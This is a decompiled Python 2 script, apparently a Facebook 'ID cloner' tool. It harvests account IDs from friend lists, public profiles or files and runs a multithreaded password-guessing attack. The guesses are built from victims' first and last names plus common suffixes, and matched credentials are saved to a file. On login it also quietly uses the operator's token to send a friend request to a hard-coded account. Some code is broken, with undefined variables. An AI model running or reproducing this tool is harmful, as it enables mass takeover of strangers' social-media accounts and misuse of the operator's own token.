
# Python Auto Dis Parser 1.0.1
# Author : HTR-TECH | TAHMID RAYAT
# https://linktr.ee/tahmid.rayat
# https://fb.me/tahmid.rayat.official
# ------------------------------------------
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: Sumarr ID
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;96m[!] \x1b[1;91mExit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


logo = '\n\x1b[1;91m          _             ____       \n\x1b[1;91m\xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x95\xae\n\x1b[1;91m\xe2\x94\x83\xe2\x95\xad\xe2\x95\xae\xe2\x94\x83\xe2\x94\x83\xe2\x95\xad\xe2\x94\x81\xe2\x95\xae\xe2\x94\x83\xe2\x95\xad\xe2\x95\xae\xe2\x95\xad\xe2\x95\xae\xe2\x94\x83\xe2\x95\xad\xe2\x94\x81\xe2\x95\xae\xe2\x94\x83\xe2\x94\x83\n\x1b[1;91m\xe2\x94\x83\xe2\x95\xb0\xe2\x95\xaf\xe2\x95\xb0\xe2\x94\xab\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\xa3\xe2\x95\xaf\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb0\xe2\x94\xab\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\n\x1b[1;91m\xe2\x94\x83\xe2\x95\xad\xe2\x94\x81\xe2\x95\xae\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x95\xad\xe2\x95\xae\n\x1b[1;91m\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\n\x1b[1;91m\xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\xe2\x95\xb1\xe2\x95\xb0\xe2\x95\xaf\xe2\x95\xb1\xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\n\x1b[0;94m  \xe2\x9a\xa1 \xe2\x9c\xaf  \xe2\x9c\xaa ID CLON3R \xe2\x9c\xac\xe2\x9a\xa1\n\x1b[0;94m  \xe2\x9a\xa1 \xe2\x9c\xaf  \xe2\x9c\xaa HacK The WoRld \xe2\x9c\xac\xe2\x9a\xa1\n\x1b[0;97m  \xe2\x9a\xa1 \xe2\x9c\xaf Github : BOTOLMEHEDI \xe2\x9c\xac\xe2\x9a\xa1\n\x1b[1;93m\xf0\x9f\x94\xa5\xe2\x95\xb0\xe2\x95\xac\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xac\xe2\x95\xaf\xf0\x9f\x94\xa5 '

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print '\n\n\x1b[1;96m ------------------------\n \x1b[1;32m < OFFICIAL CODER MEHEDI >\n \x1b[1;96m ------------------------\n\x1b[1;32m _    _       __  __\n\x1b[1;32m\xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x95\xae\n\x1b[1;32m\xe2\x94\x83\xe2\x95\xad\xe2\x95\xae\xe2\x94\x83\xe2\x94\x83\xe2\x95\xad\xe2\x94\x81\xe2\x95\xae\xe2\x94\x83\xe2\x95\xad\xe2\x95\xae\xe2\x95\xad\xe2\x95\xae\xe2\x94\x83\xe2\x95\xad\xe2\x94\x81\xe2\x95\xae\xe2\x94\x83\xe2\x94\x83\n\x1b[1;32m\xe2\x94\x83\xe2\x95\xb0\xe2\x95\xaf\xe2\x95\xb0\xe2\x94\xab\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\xa3\xe2\x95\xaf\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb0\xe2\x94\xab\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\n\x1b[1;32m\xe2\x94\x83\xe2\x95\xad\xe2\x94\x81\xe2\x95\xae\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x95\xad\xe2\x95\xae\n\x1b[1;32m\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\n\x1b[1;32m\xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\xe2\x95\xb1\xe2\x95\xb0\xe2\x95\xaf\xe2\x95\xb1\xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\n=====================================================\n                    ASSALAMU ALAIKUM                    \n            Coded By : MEHEDI HASAN ARIYAN       \n                 Facebook : fb.com/TheMehtan                \n            Youtube : youtube.com/MasterTrick1     \n                Website : www.BanglarTrick.xyz            \n     ---------------    ---------------    ------------  \n                    Team V-VIRUS [ TVV ]                     \n  =====================================================\n\x1b[1;97m------------------------------------+-----------------'
jalan('\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\x1b[1;99mBOTOL MEHEDI\x1b[1;99m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2')
jalan('\x1b[1;96m  ___ _    __   __  _  ___  ___ ')
jalan('\x1b[1;96m / _/| |  /__\\ |  \\| || __|| _ \\ CLONE ALL COUNTRY')
jalan("\x1b[1;96m| \\__| |_| \\/ || | ' || _| | v / ")
jalan('\x1b[1;96m \\__/|___|\\__/ |_|\\__||___||_|_\\ ')
jalan('\x1b[1;97m INDIAN USER USE ANY PROXY TO CLONE')
jalan('\x1b[1;97m WIFI USER USE ANY PROXY TO CLONE')
jalan('\x1b[1;93m Welcome to BOTOL CLON3R')
jalan('\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\x1b[1;96mTeam VVIRUS\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2')
CorrectUsername = 'botol'
CorrectPassword = 'botol'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;97m\xf0\x9f\x93\x8b \x1b[1;95mTool UserName\x1b[1;97m\xc2\xbb\xc2\xbb \x1b[1;97m')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;97m\xf0\x9f\x97\x9d \x1b[1;95mTool Password\x1b[1;97m\xc2\xbb\xc2\xbb \x1b[1;97m')
        if password == CorrectPassword:
            print 'Logged in successfully as ' + username
            time.sleep(2)
            loop = 'false'
        else:
            print '\x1b[1;96mWrong Password'
            os.system('xdg-open https://www.banglartrick.xyz')
    else:
        print '\x1b[1;96mWrong Username'
        os.system('xdg-open https://www.facebook.com/TheMehtan')

def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 42 * '\x1b[1;96m='
        print '\x1b[1;96m[\xe2\x9a\xa1] \x1b[1;93mLogin your new id \x1b[1;93m[\xe2\x9a\xa1]'
        id = raw_input('\x1b[1;963m[+] \x1b[0;34mEnter ID/Email \x1b[1;93m: \x1b[1;93m')
        pwd = raw_input('\x1b[1;93m[+] \x1b[0;34mEnter Password \x1b[1;93m: \x1b[1;93m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mLogin Successful'
                os.system('xdg-open https://www.youtube.com/mastertrick1')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;96m[!] \x1b[1;91mYour Account is On CheckPoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;96m[!] \x1b[1;91mPassword/Email Wrong'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
        b = json.loads(ots.text)
        sub = str(b['summary']['total_count'])
    except KeyError:
        os.system('clear')
        print '\x1b[1;91mYour Account is on Checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;92mThere is no internet connection'
        keluar()

    os.system('clear')
    print logo
    print '   \x1b[1;36;40m      \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;32;40m[*] Name\x1b[1;32;40m: ' + nama + '  \t   \x1b[1;36;40m\xe2\x95\x91'
    print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;33;40m[*] ID  \x1b[1;34;40m: ' + id + '        \x1b[1;36;40m\xe2\x95\x91'
    print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;36;40m[*] Subs\x1b[1;34;40m: ' + sub + '                      \x1b[1;36;40m\xe2\x95\x91'
    print '   \x1b[1;36;40m      \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    print '\x1b[1;32;40m[1] \x1b[1;33;41mHack Facebook Accounts'
    print '\x1b[1;32;40m[2] \x1b[1;33;42mUpdate This Tool'
    print '\x1b[1;32;40m[0] \x1b[1;33;43mLog out'
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;31;40m>>> \x1b[1;35;40m')
    if unikers == '':
        print '\x1b[1;91mFill in correctly'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '2':
        os.system('clear')
        print logo
        print ' \x1b[1;36;40m\xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f\n'
        os.system('git pull origin master')
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
    elif unikers == '0':
        jalan('Token Removed')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;91mFill in correctly'
        pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;32;40m[type1] \x1b[1;33;41mHack From Friend List'
    print '\x1b[1;32;40m[type2] \x1b[1;33;42mHack From Public ID'
    print '\x1b[1;32;40m[type3] \x1b[1;33;43mHack Bruteforce'
    print '\x1b[1;32;40m[type4] \x1b[1;33;44mHack From File'
    print '\x1b[1;32;40m[type0] \x1b[1;33;45mBack'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;31;40m>>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;91mFill in correctly'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            jalan('\x1b[1;93m[\xe2\x9c\xba] Getting IDs \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;96m[*] Enter ID : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;31;40m[\xe2\x9c\xba] Name : ' + op['name']
            except KeyError:
                print '\x1b[1;92m[\xe2\x9c\xba] ID Not Found!'
                raw_input('\n\x1b[1;96m[\x1b[1;94mBack\x1b[1;96m]')
                super()

            print '\x1b[1;35;40m[\xe2\x9c\xba] Getting IDs...'
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '3':
            os.system('clear')
            print logo
            brute()
        elif peak == '4':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[1;91m[+] \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;93m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except IOError:
                print '\x1b[1;96m[!] \x1b[1;91mFile Not Found'
                raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;91m]')
                super()

        elif peak == '0':
            menu()
        else:
            print '\x1b[1;96m[!] \x1b[1;91mFill in correctly'
            pilih_super()
        print '\x1b[1;96m[+] \x1b[1;93mTotal IDs \x1b[1;91m: \x1b[1;97m' + str(len(id))
        jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStarting \x1b[1;97m...')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;96m[\x1b[1;97m\xe2\x9c\xb8\x1b[1;96m] \x1b[1;93mCracking \x1b[1;97m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print
    print '\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z'
    print 42 * '\x1b[1;96m='

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '786'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' \xe2\x9a\xa1 ' + b['name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;36;40m[HACKED] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' \xe2\x9a\xa1 ' + b['name']
                cek = open('out/CP.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' \xe2\x9a\xa1 ' + b['name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;36;40m[HACKED] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' \xe2\x9a\xa1 ' + b['name']
                    cek = open('out/CP.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' \xe2\x9a\xa1 ' + b['name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;36;40m[HACKED] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' \xe2\x9a\xa1 ' + b['name']
                        cek = open('out/CP.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass4)
                    else:
                        pass4 = b['first_name'] + '1234'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' \xe2\x9a\xa1 ' + b['name']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;36;40m[HACKED] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' \xe2\x9a\xa1 ' + b['name']
                            cek = open('out/CP.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = '786786'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m|\x1b[1;92m ' + pass5 + ' \xe2\x9a\xa1 ' + b['name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;36;40m[HACKED] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' \xe2\x9a\xa1 ' + b['name']
                                cek = open('out/CP.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = b['last_name'] + '123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m|\x1b[1;92m ' + pass6 + ' \xe2\x9a\xa1 ' + b['name']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;36;40m[HACKED] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' \xe2\x9a\xa1 ' + b['name']
                                    cek = open('out/CP.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = 'Pakistan'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m|\x1b[1;92m ' + pass7 + ' \xe2\x9a\xa1 ' + b['name']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;36;40m[HACKED] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' \xe2\x9a\xa1 ' + b['name']
                                        cek = open('out/CP.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;31;40m[\xe2\x9c\x93] Process Has Been Completed\x1b[1;96m....'
    print '\x1b[1;32;40m[+] Total OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;91m' + str(len(oks)) + '\x1b[1;31;40m/\x1b[1;36;40m' + str(len(cekpoint))
    print '\x1b[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
